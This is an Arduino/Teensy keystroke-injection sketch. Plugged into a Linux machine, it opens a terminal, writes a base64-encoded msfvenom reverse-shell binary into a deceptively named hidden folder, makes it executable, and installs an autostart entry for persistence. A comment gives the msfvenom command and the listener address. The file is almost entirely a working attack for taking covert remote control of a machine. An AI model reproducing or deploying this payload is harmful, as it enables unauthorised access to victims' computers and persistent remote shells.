
void setup() 
{
  Serial.begin(9600);
  delay(100);
}



void loop() 
{
  Keyboard.press(MODIFIERKEY_CTRL);
  Keyboard.press(MODIFIERKEY_ALT);
  Keyboard.press(KEY_T);
  Keyboard.release(MODIFIERKEY_CTRL);
  Keyboard.release(MODIFIERKEY_ALT);
  Keyboard.release(KEY_T);
  delay(2000);

  Keyboard.println("mkdir -p $HOME/.com.google.garbage");
  delay(100);

  /*
    Created a reverse meterpreter payload with msfvenom then base64 it:
    $ msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=192.168.1.250 LPORT=12389 -b "\x00" -f elf -o payload
    $ echo $(hexdump -v -e '"\\""x" 1/1 "%02x" ""' ${1} payload) | base64
    We just have to de-base64 it and copy it into the target machine
  */

  Keyboard.println("echo 'f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjqAAAAgAEAAAcAAAAAEAAAuIwgYr/a39l0JPRbM8mxH4Pr/DFDEQNDEeJ5SmjhsFCb/uElN2sHGtHi5peeYrNPXyRCajc3RLqtvqXQS5l1dMOQlDUmItN6wTqz2DI9Q0VZPSlwFN6cs+uhW4OMjS1x0CWWyy0D2Dsyc1HY85ht3hdS3Z0a65ie3fz5l/9kS6tPlX40Klr4N8q6QDY0PbCCNT2w9Pi9Cg==' | base64 -d | cat > $HOME/.com.google.garbage/friendly_binary");
  delay(100);
  Keyboard.println("chmod +x $HOME/.com.google.garbage/friendly_binary");
  delay(100);

  /*
    The fellowing is just the file to run a script/binary at session logging copied to ~/.config/autostart/ ...
  */
  Keyboard.println("echo 'W0Rlc2t0b3AgRW50cnldClR5cGUgPSBBcHBsaWNhdGlvbgpOYW1lID0gZnJpZW5kbHlfYmluYXJ5CkV4ZWMgPSAvdG1wLy5jb20uZ29vZ2xlLmdhcmJhZ2UvZnJpZW5kbHlfYmluYXJ5ClRlcm1pbmFsID0gZmFsc2U=' | base64 -d | cat > $HOME/.config/autostart/friendly_binary.desktop");
  delay(100);
  Keyboard.println("exit");
  //Keyboard.println("exit");
  // typing too rapidly can overwhelm a PC
  delay(1000000);
}
